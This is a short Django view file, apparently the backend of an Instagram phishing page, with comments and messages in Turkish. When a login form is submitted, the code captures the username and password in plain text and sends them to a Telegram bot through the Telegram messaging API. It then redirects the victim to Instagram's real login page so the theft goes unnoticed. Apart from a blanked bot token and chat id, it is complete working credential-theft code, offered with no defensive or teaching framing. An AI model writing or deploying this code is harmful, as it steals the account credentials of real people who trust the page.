import requests
from django.http import HttpResponse
from django.shortcuts import redirect, render
def index(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        # Telegram botuna HTTP isteği gönder
        send_telegram_message(username, password)

        return redirect('https://www.instagram.com/accounts/login/')
    return render(request, 'myapp/index.html')

def send_telegram_message(username, password):
    bot_token = ':'
    chat_id = ''

    message = f'Kullanıcı Adı: {username}, Şifre: {password}'
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    params = {'chat_id': chat_id, 'text': message}
    response = requests.post(url, params=params)
    if response.status_code == 200:
        print('Telegram mesajı başarıyla gönderildi!')
    else:
        print('Telegram mesajı gönderilirken bir hata oluştu!')

